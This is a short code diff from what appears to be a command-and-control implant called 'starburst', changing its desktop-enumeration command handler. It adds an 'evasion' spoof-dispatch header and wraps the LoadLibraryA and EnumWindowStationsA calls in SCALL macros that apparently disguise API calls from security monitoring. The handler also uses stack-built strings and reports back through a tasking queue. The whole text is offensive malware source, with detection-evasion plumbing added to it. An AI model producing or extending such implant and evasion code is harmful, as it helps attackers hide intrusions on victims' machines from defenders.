@@ -5,6 +5,7 @@
 #include <config.h>
 #include <strings.h>
 #include <stackstr.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_ENUMDESKTOPS
 
@@ -82,7 +83,7 @@ auto declfn starburst::cmd_enumdesktops(
     DBG_PRINT( inst, "cmd_enumdesktops\n" );
 
     STK_USER32(_n);
-    auto h_user32 = inst.kernel32.LoadLibraryA( _n );
+    auto h_user32 = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n );
     if ( !h_user32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "failed to load user32.dll" ) ) );
@@ -131,7 +132,7 @@ auto declfn starburst::cmd_enumdesktops(
     memory::copy( output, hdr, hdr_len );
     ctx.off = hdr_len;
 
-    pEnumWindowStationsA( ws_callback, reinterpret_cast<LPARAM>( &ctx ) );
+    SCALL_PTR( inst, pEnumWindowStationsA, ws_callback, reinterpret_cast<LPARAM>( &ctx ) );
 
     output[ctx.off] = '\0';
 
